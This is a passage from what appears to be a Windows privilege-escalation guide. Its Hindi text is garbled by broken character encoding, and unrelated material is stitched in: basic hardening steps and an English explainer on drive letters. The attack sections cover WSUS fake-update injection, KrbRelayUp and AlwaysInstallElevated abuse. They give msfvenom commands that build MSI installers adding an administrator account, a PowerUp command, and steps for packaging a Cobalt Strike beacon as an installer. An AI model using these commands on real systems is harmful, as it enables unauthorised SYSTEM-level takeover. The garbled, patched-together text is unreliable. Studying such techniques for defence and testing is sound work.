User Account Control (UAC) рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ рдЬреЛ рдЕрдирдзрд┐рдХреГрдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рдЦреБрд▓рд╛рд╕реЗ рд╕реЗ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрддреА рд╣реИред рдЗрд╕реЗ рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ:

1. "Control Panel" рдЦреЛрд▓реЗрдВ рдФрд░ "User Accounts" рдЪреБрдиреЗрдВред
2. "Change User Account Control settings" рдЪреБрдиреЗрдВред
3. рд╕реНрд▓рд╛рдЗрдбрд░ рдХреЛ "Always notify" рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред
4. "OK" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

#### Windows Updates

Windows рдЕрдкрдбреЗрдЯреНрд╕ рдЖрдкрдХреЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдирд╡реАрдирддрдо рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдЕрджреНрдпрддрд┐рдд рд░рдЦрддреЗ рд╣реИрдВред рдЗрд╕реЗ рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ:

1. "Settings" рдЦреЛрд▓реЗрдВ рдФрд░ "Update & Security" рдЪреБрдиреЗрдВред
2. "Windows Update" рдЯреИрдм рдкрд░ рдЬрд╛рдПрдВ рдФрд░ "Check for updates" рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
3. рдЙрдкрд▓рдмреНрдз рдЕрдкрдбреЗрдЯреНрд╕ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВред

#### Account Passwords

рд╕реБрд░рдХреНрд╖рд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рдЖрдкрдХреЗ рдЦрд╛рддреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреВрдорд┐рдХрд╛ рдирд┐рднрд╛рддрд╛ рд╣реИред рдирд┐рдореНрди рдЪрд░рдгреЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ рдордЬрдмреВрдд рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ:

1. "Control Panel" рдЦреЛрд▓реЗрдВ рдФрд░ "User Accounts" рдЪреБрдиреЗрдВред
2. "Manage your credentials" рдЪреБрдиреЗрдВред
3. "Change your password" рдЪреБрдиреЗрдВ рдФрд░ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рджрд░реНрдЬ рдХрд░реЗрдВред
4. "OK" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### рдбреНрд░рд╛рдЗрд╡реНрд╕

In Windows, a drive refers to a storage device that is assigned a letter, such as C:, D:, etc. Drives can be physical devices, such as hard drives or solid-state drives, or they can be virtual drives, such as network drives or disk image files.

#### Drive Types

There are several types of drives in Windows:

- **Local Drives**: These are physical drives that are directly connected to the computer, such as the internal hard drive or external USB drives.

- **Network Drives**: These are drives that are shared over a network and can be accessed by multiple computers. They are assigned a drive letter and appear as if they are local drives.

- **Virtual Drives**: These are drives that are created using software and appear as if they are physical drives. Examples include disk image files (ISO files) or virtual hard drives (VHD files).

#### Drive Letters

Each drive in Windows is assigned a unique drive letter, which is used to identify and access the drive. The most commonly used drive letters are C:, D:, and E:, but other letters can also be used.

Drive letters are assigned based on the order in which the drives are detected by the operating system. The C: drive is typically reserved for the system drive, which contains the operating system files.

#### Accessing Drives

To access a drive in Windows, you can use File Explorer or the command prompt. In File Explorer, drives are listed under the "This PC" or "Computer" section. You can double-click on a drive to open it and view its contents.

In the command prompt, you can use the drive letter followed by a colon (e.g., C:) to switch to a specific drive. For example, typing `C:` and pressing Enter will switch to the C: drive.

#### Drive Permissions

Each drive in Windows has its own set of permissions that determine who can access and modify its contents. By default, the system drive (usually C:) is only accessible to administrators, while other drives may have different permissions.

To view and modify drive permissions, you can right-click on a drive in File Explorer, select "Properties," and navigate to the "Security" tab. From there, you can add or remove users and groups and assign different levels of access.

#### Conclusion

Understanding drives in Windows is essential for managing and accessing storage devices. By knowing the different types of drives, their assigned letters, and how to access and modify their permissions, you can effectively work with drives in a Windows environment.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рдЕрдкрдбреЗрдЯ http рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд╣реАрдВ, рдмрд▓реНрдХрд┐ http**S** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдХрд░ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдПрдХ non-SSL WSUS рдЕрдкрдбреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдЬрд╡рд╛рдм рдорд┐рд▓рддрд╛ рд╣реИ рдЬреИрд╕реЗ:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
рдФрд░ рдпрджрд┐ `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` рдХрд╛ рдорд╛рди `1` рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИред

рддреЛ, **рдЗрд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред** рдпрджрд┐ рдЕрдВрддрд┐рдо рд░рдЬрд┐рд╕реНрдЯреНрд░реА 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рддреЛ WSUS рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЗрди рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рддрд░рд╣ рдХреЗ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- рдпреЗ MiTM рд╣рдерд┐рдпрд╛рд░реА рдЙрддреНрдкрдиреНрди рдЕрдкрдбреЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИрдВ рдЬреЛ рдЧреИрд░-SSL WSUS рдЯреНрд░реИрдлрд┐рдХ рдореЗрдВ 'fake' рдЕрдкрдбреЗрдЯреНрд╕ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рддреА рд╣реИрдВред

рдпрд╣рд╛рдВ рдЕрдиреБрд╕рдВрдзрд╛рди рдкрдврд╝реЗрдВ:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**рдкреВрд░реА рд░рд┐рдкреЛрд░реНрдЯ рдпрд╣рд╛рдВ рдкрдврд╝реЗрдВ**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)ред\
рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрд╣ рджреЛрд╖ рд╣реИ рдЬрд┐рд╕реЗ рдпрд╣ рдмрдЧ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ:

> рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рд╢рдХреНрддрд┐ рд╣реИ, рдФрд░ рд╡рд┐рдВрдбреЛрдЬ рдЕрдкрдбреЗрдЯ рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЕрдкрдиреЗ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рдиреЗ рдФрд░ рдЕрдкрдиреЗ рдПрд╕реЗрдЯ рдкрд░ рдЙрдЪреНрдЪрддрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреЛрдб рдЪрд▓рд╛рдиреЗ рдХреА рд╢рдХреНрддрд┐ рд╣реЛрдЧреАред
>
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреНрдпреЛрдВрдХрд┐ WSUS рд╕реЗрд╡рд╛ рдореЗрдВ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рдпрд╣ рдЕрдкрдиреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рдВрдЧреНрд░рд╣ рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ред рдпрджрд┐ рд╣рдо WSUS рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реНрд╡-рд╕рд╛рдЗрди рдХрд┐рдпрд╛ рд╣реБрдЖ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд╕рдВрдЧреНрд░рд╣ рдореЗрдВ рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ, рддреЛ рд╣рдо HTTP рдФрд░ HTTPS WSUS рдЯреНрд░реИрдлрд┐рдХ рджреЛрдиреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░ рд╕рдХреЗрдВрдЧреЗред WSUS рдиреЗ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕-рдкрд╣рд▓реЗ-рдЙрдкрдпреЛрдЧ рдЬреИрд╕реЗ рддрд░реНрдХ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ HSTS рдЬреИрд╕реА рдпреБрдХреНрддрд┐рдпрд╛рдБ рдирд╣реАрдВ рдмрдирд╛рдИ рд╣реИрдВред рдпрджрд┐ рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╣реА рд╣реЛрд╕реНрдЯрдирд╛рдо рд╣реИ, рддреЛ рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдХрд░рдг [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрдм рдпрд╣ рдореБрдХреНрдд рд╣реЛ рдЬрд╛рдПрдЧрд╛)ред

## KrbRelayUp

рдпрд╣ рдореВрд▓ рд░реВрдк рд╕реЗ рд╡рд┐рдВрдбреЛрдЬ **рдбреЛрдореЗрди** рдкрд░рд┐рд╡реЗрд╢ рдореЗрдВ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдирд┐рд░реНрдорд╛рдг рдирд╣реАрдВ рд╣реИ рдЬрд╣рд╛рдВ **LDAP рд╕рд╛рдЗрдирд┐рдВрдЧ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ**, рдЬрд╣рд╛рдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ рд╕реНрд╡рдпрдВ рдХреЗ рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ** (RBCD рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) рдФрд░ рдЬрд╣рд╛рдВ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЛрдореЗрди рдореЗрдВ рдХрдВрдкреНрдпреВрдЯрд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рд╕рднреА **рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ** **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕** рдХреЗ рд╕рд╛рде рдкреВрд░реА рд╣реЛрддреА рд╣реИрдВред

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) рдореЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЙрддреНрдкрд╛рджрдиред

рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдо рдЕрдЯреИрдХ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдпрджрд┐ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЕрдЯреИрдХ рдХреА рдлрд╝реНрд▓реЛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**рдпрджрд┐** рдпреЗ 2 рд░рдЬрд┐рд╕реНрдЯрд░ **рд╕рдХреНрд╖рдо** рд╣реИрдВ (рдорд╛рди **0x1** рд╣реИ), рддреЛ рдХрд┐рд╕реА рднреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ NT AUTHORITY\\**SYSTEM** рдХреЗ рд░реВрдк рдореЗрдВ `*.msi` рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрдерд╛рдкрд┐рдд (рдЪрд▓рд╛рдИ) рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit рдкреЗрд▓реЛрдбреНрд╕

Metasploit рдкреЗрд▓реЛрдбреНрд╕ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдХрд┐рдВрдЧ рдЯреВрд▓ рд╣реИ рдЬреЛ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЛрдВ рдХреЛ рдЕрд╡рдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдкреЗрд▓реЛрдбреНрд╕ рдПрдХ рд╡рд┐рд╢реЗрд╖ рддрд░реАрдХреЗ рд╕реЗ рддреИрдпрд╛рд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдЙрджреНрджреЗрд╢реНрдп рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд▓реЛрдХрд▓ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирдпрди рдХрд░рдирд╛ред

Metasploit рдкреЗрд▓реЛрдбреНрд╕ рдХрдИ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣реЛрддреЗ рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВ:

- **рд╢реЗрд▓ рдкреЗрд▓реЛрдбреНрд╕**: рдпреЗ рдкреЗрд▓реЛрдбреНрд╕ рдПрдХ рд╢реЗрд▓ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░рд┐рдореЛрдЯ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред
- **рдореЗрдЯрд░рдкреНрд░реЗрдЯрд░ рдкреЗрд▓реЛрдбреНрд╕**: рдпреЗ рдкреЗрд▓реЛрдбреНрд╕ рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдирд┐рдпрдВрддреНрд░рдг рдкреИрдирд▓ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред
- **рд╡реЗрдмрд╢реЗрд▓ рдкреЗрд▓реЛрдбреНрд╕**: рдпреЗ рдкреЗрд▓реЛрдбреНрд╕ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░рд┐рдореЛрдЯ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред

рдпреЗ рдкреЗрд▓реЛрдбреНрд╕ Metasploit рдЯреВрд▓ рдХреЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд╣рдорд▓реЛрдВ рдХреЛ рдЕрд╡рдзрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред рдЗрди рдкреЗрд▓реЛрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рд▓рдХреНрд╖рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рд╕рддреНрд░ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдПрдХ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **`exploit/windows/local/always_install_elevated`**

### PowerUP

Power-up рд╕реЗ `Write-UserAddMSI` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ Windows MSI рдмрд╛рдЗрдирд░реА рдмрдирд╛рдПрдВ рддрд╛рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХреЗрдВред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ рдкреВрд░реНрд╡-рд╕рдВрдХрд▓рд┐рдд MSI рд╕реНрдерд╛рдкрдХ рд▓рд┐рдЦрддрд╛ рд╣реИ рдЬреЛ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ / рд╕рдореВрд╣ рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢реНрди рдкреВрдЫрддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ GIU рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА):
```
Write-UserAddMSI
```
рдХреЗрд╡рд▓ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд┐рдд рдмрд╛рдЗрдирд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред

### MSI рд╡реНрд░рд╛рдкрд░

рдЗрд╕ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ MSI рд╡реНрд░рд╛рдкрд░ рдХреИрд╕реЗ рдмрдирд╛рдПрдВ, рдЗрд╕ рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓ рдХреЛ рдкрдврд╝реЗрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк рдПрдХ "**.bat**" рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░реИрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдкрдХреЛ рдХреЗрд╡рд▓ **рдХрдорд╛рдВрдб рд▓рд╛рдЗрдиреНрд╕** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдирд╛ рд╣реИ

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX рдХреЗ рд╕рд╛рде MSI рдмрдирд╛рдПрдВ

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio рдХреЗ рд╕рд╛рде MSI рдмрдирд╛рдПрдВ

* **Cobalt Strike** рдпрд╛ **Metasploit** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `C:\privesc\beacon.exe` рдореЗрдВ рдПрдХ **рдирдпрд╛ Windows EXE TCP рдкреЗрд▓реЛрдб** рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ
* **Visual Studio** рдЦреЛрд▓реЗрдВ, **рдирдИ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдмрдирд╛рдПрдВ** рдЪреБрдиреЗрдВ рдФрд░ рдЦреЛрдЬ рдмреЙрдХреНрд╕ рдореЗрдВ "installer" рдЯрд╛рдЗрдк рдХрд░реЗрдВред **Setup Wizard** рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **рдЕрдЧрд▓рд╛** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдПрдХ рдирд╛рдо рджреЗрдВ, рдЬреИрд╕реЗ **AlwaysPrivesc**, рд╕реНрдерд╛рди рдХреЗ рд▓рд┐рдП **`C:\privesc`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, **рд╕рдорд╛рдзрд╛рди рдФрд░ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреЛ рдПрдХ рд╣реА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд░рдЦреЗрдВ** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **рдмрдирд╛рдПрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* **рдЕрдЧрд▓реЗ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддреЗ рд░рд╣реЗрдВ рдЬрдм рддрдХ рдЖрдк рдЪрд░рдг 3 рдореЗрдВ рдирд╣реАрдВ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВ (рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓реЗрдВ рдЪреБрдиреЗрдВ)ред **рдЬреЛрдбрд╝реЗрдВ** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЧрдП Beacon рдкреЗрд▓реЛрдб рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рдлрд┐рд░ **рд╕рдорд╛рдкреНрдд** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
